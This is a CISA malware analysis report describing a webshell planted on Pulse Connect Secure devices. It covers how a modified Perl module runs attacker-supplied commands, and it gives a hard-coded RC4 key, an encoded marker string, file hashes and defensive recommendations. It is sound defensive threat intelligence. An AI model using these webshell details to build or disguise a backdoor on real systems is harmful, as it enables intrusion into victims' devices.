Summary Description Four files were submitted to CISA for analysis. Some of the files consist of shell scripts designed to modify a file to become a webshell. The webshell is designed to check and parse incoming web requests data. This analysis is derived from malicious files found on Pulse Connect Secure devices. For a downloadable copy of IOCs, see: MAR-10333209-1.v1.stix .

The modified CGI script file contains a webshell script designed to check and parse incoming web requests data from a webshell. It is designed to search, extract and execute command (CMD) parameters passed by the attacker on the victim's system. It creates a form containing the extracted command to be executed and the parameter value "serverid". The output of every command executed on the victim's system will include an RC4 encrypted and Base64 encoded string: "TD3ru+SCIVQ+BB1m9YlwxA==" (which has a plaintext value of "1234567812345678"). The string "1234567812345678" is encrypted first using the RC4 key "1234567" before it is Base64 encoded. These strings are hard-coded into the script. 6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767 Tags webshell Details Name DSUpgrade.pm Size 9791 bytes Type Perl5 module source, ASCII text MD5 4d5b410e1756072a701dfd3722951907 SHA1 cc68a9c5ff57129e8b897d228e54807841f8ff67 SHA256 6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767 SHA512 965b13b1a11c2b2472de1f491bb3fde1d96288fa204428b135281ae7928a5bafea5c244fdd1f47a96242861c94a4fa8d5f6664f543dec33cfc519faca044766d ssdeep 192:eIB1XcTfXss+nBqXb+TSWbgXCiwWjoBTWFI4MhiirXHLwQBNaBiF3Ar8yXpayUM6:eIB1X1phiJ/irZNaBiF3CjCswmPyVoM Entropy 5.235000 Antivirus No matches found.

Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts. Maintain up-to-date antivirus signatures and engines. Keep operating system patches up-to-date. Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication. Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required. Enforce a strong password policy and implement regular password changes. Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known. Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests. Disable unnecessary services on agency workstations and servers. Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header). Monitor users' web browsing habits; restrict access to sites with unfavorable content. Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.). Scan all software downloaded from the Internet prior to executing. Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
